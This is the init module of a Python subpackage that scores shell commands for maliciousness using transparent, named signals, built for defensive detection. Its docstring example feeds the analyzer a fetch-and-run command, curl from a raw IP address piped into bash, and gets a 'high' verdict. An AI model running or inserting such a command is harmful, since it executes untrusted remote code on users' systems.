"""Maliciousness scoring built on top of the feature extractor.

This subpackage is the only part of ``cmdfeat`` that assigns *weight* to what a
command does.  The extractor says what happened; the scorer says how much that
matters, as a transparent, auditable sum of named signals -- not a trained
model and not a probability.

    from cmdfeat.scoring import Analyzer
    a = Analyzer()
    result = a.assess("curl -s http://1.2.3.4/x.sh | bash")
    print(result.score, result.verdict)        # 55 high

Everything here is non-executing, exactly like the rest of the package.
"""

from __future__ import annotations

from .analyze import Analyzer
from .engine import Assessment, Hit, score_record, verdict_for
from .signals import SCRIPT_SIGNALS, SIGNALS, Signal

__all__ = [
    "Analyzer",
    "Assessment",
    "Hit",
    "Signal",
    "SIGNALS",
    "SCRIPT_SIGNALS",
    "score_record",
    "verdict_for",
]
